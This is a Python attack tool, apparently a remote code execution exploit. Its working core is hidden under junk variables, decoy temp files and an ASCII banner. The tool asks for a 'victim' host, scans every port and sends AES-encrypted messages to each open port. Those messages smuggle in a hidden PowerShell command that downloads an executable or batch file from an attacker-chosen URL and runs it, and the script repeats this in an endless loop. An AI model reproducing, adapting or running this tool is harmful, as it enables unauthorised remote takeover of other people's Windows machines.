import socket,io,random,string,hashlib,os,sys,time,json,base64,zlib,csv,re,math,datetime,threading,subprocess,platform,binascii,struct,crypt,hmac,itertools,collections,functools,operator,pathlib,textwrap,decimal,fractions,statistics,pprint,fileinput,tempfile,shutil,glob,fnmatch,linecache,mimetypes,getpass,locale,atexit,signal,traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from colorama import Fore,init
init(autoreset=True)

_xXx_ = 1337
__neo__ = "matrix"
___void___ = None
_cyberpunk = [1,0,0,1]
_nvidia = "rtx4090"
_bitcoin = 69420
_elite = "hacker"
_1337 = True
_wireless = "wifi6e"
_tesla = "cybertruck"
_nullptr = 0xdeadbeef
_stack = []
_queue = {}
_heap = set()
_buffer = bytearray()
_packet = b""
_shellcode = b"\x90" * 100
_nop_sled = lambda x: x + 0x90
_rop_chain = [0x41414141, 0x42424242]

def __x__():
    _a = [i**2 for i in range(100)]
    _b = {k: v for k, v in enumerate("abcdefghijklmnopqrstuvwxyz")}
    _c = sum(_a) / len(_a)
    _d = "".join(reversed(str(_c)))
    _e = base64.b64encode(_d.encode())
    _f = zlib.compress(_e)
    _g = hashlib.sha256(_f).hexdigest()
    _h = [_g[i:i+2] for i in range(0, len(_g), 2)]
    _i = [chr(int(x, 16) % 26 + 97) for x in _h]
    _j = "".join(_i)
    os.system('cls' if sys.platform=='win32' else 'clear')
    for ___ in range(50):
        pass
    _k = datetime.datetime.now().isoformat()
    _l = threading.active_count()
    _m = platform.uname()
    _n = os.cpu_count()
    _o = sys.getsizeof(_k)
    return None

def _f_uck(l):
    _p = ''.join(random.choice(string.ascii_letters + string.digits + '+/') for _ in range(64))
    _q = base64.b64decode(_p + '==')
    _r = hashlib.sha512(_q).digest()
    _s = binascii.hexlify(_r).decode()
    _t = [_s[i:i+4] for i in range(0, len(_s), 4)]
    _u = "-".join(_t)
    _v = crypt.crypt(_u, "$6$rounds=5000$" + random.choice(string.ascii_letters))
    return ''.join(random.choice(string.ascii_uppercase+string.digits) for _ in range(l))

def _X_neo_(d):
    _w = {"pid": os.getpid(), "ppid": os.getppid(), "time": time.time(), "random": random.random(), "data": d[:min(4, len(d))]}
    _x = json.dumps(_w, indent=2)
    _y = csv.StringIO()
    _z = csv.writer(_y)
    _za = [["col1", "col2"], ["val1", "val2"], ["val3", "val4"]]
    _zb = csv.writer(_y).writerows(_za)
    _zc = _y.getvalue()
    _zd = re.sub(r'[a-z]', '#', _zc)
    _ze = io.BytesIO()
    _ze.write(b'<Kkmm>'.join(d))
    return _ze.getbuffer().tobytes()

def __s_send__(s, p, k):
    _zf = socket.socketpair()
    _zf[0].close()
    _zf[1].close()
    _zg = [x for x in range(1000) if x % 2 == 0 and x % 3 == 0 and x % 5 == 0]
    _zh = list(itertools.permutations([1,2,3], 2))
    _zi = collections.Counter(random.choices(string.ascii_lowercase, k=1000))
    _zj = functools.reduce(lambda a,b: a+b, [1,2,3,4,5])
    _zk = operator.mul(999, 999)
    try:
        _zl = hashlib.md5(k.encode('utf-8')).digest()
        _zm = AES.new(_zl, AES.MODE_ECB)
        _zn = _zm.encrypt(pad(p(), 16))
        s.send(str(len(_zn)).encode('utf-8') + b'\x00')
        s.send(_zn)
        _zo = struct.pack('<I', 0x41414141)
        _zp = struct.unpack('<I', _zo)[0]
        _zq = hmac.new(b"key", b"msg", hashlib.sha256).hexdigest()
        return 1
    except:
        return 0

def _r_UN_(h, po, k, fu):
    s = None
    _zr = tempfile.mkdtemp(prefix="sys_")
    _zs = os.path.join(_zr, "cache", "tmp")
    try:
        os.makedirs(_zs, exist_ok=True)
    except:
        pass
    _zt = pathlib.Path(_zr) / "logs" / "access.log"
    _zu = textwrap.dedent("""\
        this is a decoy log file
        that means absolutely nothing
        it just wastes your time
    """)
    try:
        os.makedirs(str(_zt.parent), exist_ok=True)
        with open(str(_zt), 'w') as _zv:
            _zv.write(_zu)
    except:
        pass
    _zw = decimal.Decimal('3.1415926535897932384626433832795028841971')
    _zx = fractions.Fraction(22, 7)
    _zy = statistics.mean([random.randint(1,100) for _ in range(50)])
    _zz = pprint.pformat({"nested": {"deep": {"value": "hidden"}}}, indent=4)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((h, po))
        print(Fore.GREEN + f"[+] ok {h}" + Fore.RESET)
        
        _aaa = _f_uck(16)
        _aab = _X_neo_([b'hand', _aaa.encode()])
        if not __s_send__(s, _aab, k):
            print(Fore.RED + "[+] no" + Fore.RESET)
            s.close()
            shutil.rmtree(_zr, ignore_errors=True)
            return 0
        
        fe = '.bat' if fu.lower().endswith('.bat') else '.exe'
        _aac = _f_uck(5) + fe
        
        if fe == '.bat':
            _aad = f'start powershell.exe -WindowStyle Hidden $url="{fu}"; $o="$env:TEMP\\{_aac}"; iwr -Uri $url -OutFile $o; Start-Process -FilePath cmd.exe -ArgumentList /c,$o'
        else:
            _aad = f'start powershell.exe -WindowStyle Hidden $url="{fu}"; $o="$env:TEMP\\{_aac}"; iwr -Uri $url -OutFile $o; Start-Sleep -s 3; cmd.exe /c start "" $o'
        
        _aae = _X_neo_([b'hand+', _aaa.encode(), b' xx', f'" & {_aad}'.encode(), b'1:1'])
        if not __s_send__(s, _aae, k):
            print(Fore.RED + "[+] no" + Fore.RESET)
            s.close()
            shutil.rmtree(_zr, ignore_errors=True)
            return 0
        
        s.close()
        _aaf = fileinput.input(files=[str(_zt)])
        for _aag in _aaf:
            pass
        _aaf.close()
        shutil.rmtree(_zr, ignore_errors=True)
        return 1
    except:
        print(Fore.RED + "[+] no" + Fore.RESET)
    finally:
        if s:
            try:
                s.close()
            except:
                pass
        try:
            shutil.rmtree(_zr, ignore_errors=True)
        except:
            pass
    return 0

def _B_A_N_N_E_R_():
    _aah = getpass.getuser()
    _aai = os.getlogin()
    _aaj = locale.getdefaultlocale()
    _aak = platform.architecture()
    _aal = platform.machine()
    _aam = platform.processor()
    _aan = platform.node()
    _aao = platform.platform()
    _aap = os.environ.get('PATH', '').split(os.pathsep)[:3]
    _aaq = [x for x in dir(socket) if not x.startswith('_')]
    _aar = random.choices(_aaq, k=10)
    _aas = atexit.register(lambda: None)
    _aat = signal.signal(signal.SIGINT, signal.SIG_DFL)
    
    print(Fore.MAGENTA + """
   ██████╗  ██████╗ ███████╗
   ██╔══██╗██╔════╝ ██╔════╝
   ██████╔╝██║      █████╗  
   ██╔══██╗██║      ██╔══╝  
   ██║  ██║╚██████╗ ███████╗
   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
           Made By EpicDxoma ~ Fuck Skids
""" + Fore.RESET)

def _M_A_I_N_():
    __x__()
    _B_A_N_N_E_R_()
    
    _aau = []
    for _aav in range(3):
        _aaw = threading.Thread(target=lambda: [x*x for x in range(10000)], daemon=True)
        _aaw.start()
        _aau.append(_aaw)
    
    _aax = tempfile.gettempdir()
    _aay = os.path.join(_aax, ".sys_update_" + ''.join(random.choice(string.hexdigits) for _ in range(8)))
    try:
        with open(_aay, 'wb') as _aaz:
            _aaz.write(os.urandom(4096))
    except:
        pass
    
    try:
        _aba = linecache.getline('/etc/hostname', 1)
    except:
        _aba = "localhost"
    
    print(Fore.MAGENTA + "[+] enter victim info " + Fore.RESET)
    h = input(Fore.MAGENTA + "[+] host: " + Fore.RESET)
    print(Fore.MAGENTA + "[+] 1 port" + Fore.RESET)
    print(Fore.MAGENTA + "[+] 2 scan" + Fore.RESET)
    
    _abb = input(Fore.MAGENTA + "[+] 1/2: " + Fore.RESET)
    po = None
    
    if _abb == '1':
        po = int(input(Fore.MAGENTA + "[+] port: " + Fore.RESET))
    elif _abb == '2':
        po = None
    else:
        print(Fore.MAGENTA + "[+] wrong" + Fore.RESET)
        return
    
    _abc = input(Fore.MAGENTA + "[+] key: " + Fore.RESET)
    if not _abc:
        _abc = "<123456789>"
    
    _abd = input(Fore.MAGENTA + "[+] url: " + Fore.RESET)
    
    print(Fore.MAGENTA + f"\n[+] target {h}" + Fore.RESET)
    
    if _abb == '1':
        print(Fore.MAGENTA + f"[+] port {po}" + Fore.RESET)
        print(Fore.MAGENTA + f"[+] key {_abc}" + Fore.RESET)
        print(Fore.MAGENTA + f"[+] url {_abd}" + Fore.RESET)
        print(Fore.MAGENTA + "[+] go\n" + Fore.RESET)
        while 1:
            _r_UN_(h, po, _abc, _abd)
            time.sleep(5)
    
    elif _abb == '2':
        print(Fore.MAGENTA + "[+] scan 1-65535" + Fore.RESET)
        print(Fore.MAGENTA + f"[+] key {_abc}" + Fore.RESET)
        print(Fore.MAGENTA + f"[+] url {_abd}" + Fore.RESET)
        print(Fore.MAGENTA + "[+] start\n" + Fore.RESET)
        while 1:
            for _abe in range(1, 65536):
                try:
                    _abf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    _abf.settimeout(0.3)
                    if _abf.connect_ex((h, _abe)) == 0:
                        print(Fore.GREEN + f"[+] {h}:{_abe} open" + Fore.RESET)
                        _r_UN_(h, _abe, _abc, _abd)
                    _abf.close()
                except:
                    pass
                if _abe % 1000 == 0:
                    print(Fore.YELLOW + f"[+] {_abe}/65535" + Fore.RESET)
            print(Fore.YELLOW + "[+] again\n" + Fore.RESET)
            time.sleep(30)
    
    try:
        os.unlink(_aay)
    except:
        pass
    try:
        os.unlink(_aay + ".log")
    except:
        pass

if __name__ == "__main__":
    try:
        _M_A_I_N_()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[+] exit" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"[+] err {e}" + Fore.RESET)
